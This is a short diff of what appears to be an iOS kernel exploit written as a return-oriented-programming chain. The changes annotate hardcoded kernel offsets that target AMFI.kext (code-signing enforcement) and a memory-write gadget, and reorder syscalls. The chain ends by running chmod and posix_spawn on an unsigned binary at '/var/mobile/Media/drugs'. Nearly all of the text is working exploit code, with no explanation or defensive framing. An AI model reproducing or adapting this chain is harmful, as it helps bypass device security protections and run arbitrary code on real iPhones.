@@ -1628,14 +1628,14 @@ step(i);\
 
     
     LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // where
-    RopAddR0(PUSH, (0x65d290-0xA0));
+    RopAddR0(PUSH, (0x65d290-0xA0)); // pointer to BSS of AMFI.kext
     StoreR0(PUSH, SEG_VAR(scratch[0x10 + 1024-0x58]));
     
     LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
     StoreR0(PUSH, SEG_VAR(scratch[0x10 + 4 + 1024-0x58]));
     
     LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // gadget
-    RopAddR0(PUSH, (0xb162e0));
+    RopAddR0(PUSH, (0xb162e0)); // pointer to write 1 gadget
     StoreR0(PUSH, SEG_VAR(scratch[0x28]));
 
     ReadWriteScratchOverlap();
@@ -1649,18 +1649,21 @@ step(i);\
     }
 
     ReadWriteScratchOverlap();
-
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
     
-
     strcpy(argss->spawnpath, "/var/mobile/Media/drugs");
     argss->spawnp[0] = SEG_VAR(spawnpath);
     argss->spawnp[1] = 0;
-
+    
+    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
+    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
+    
+/* 
+    [dy setSlide:dy.slide+1]; // enter thumb
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
+    [dy setSlide:dy.slide-1]; // exit thumb
+*/
+    
     RopCallFunction3(PUSH, @"___syscall", SYS_chmod, SEG_VAR(spawnpath), 0755);
-
     RopCallFunction7(PUSH, @"___syscall", SYS_posix_spawn, m_m_scratch, SEG_VAR(spawnpath), 0, 0, SEG_VAR(spawnp), 0);
 
     RecvMsg(PUSH, 300, tmp_msg);
@@ -1671,11 +1674,7 @@ step(i);\
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
     
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
 
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
     
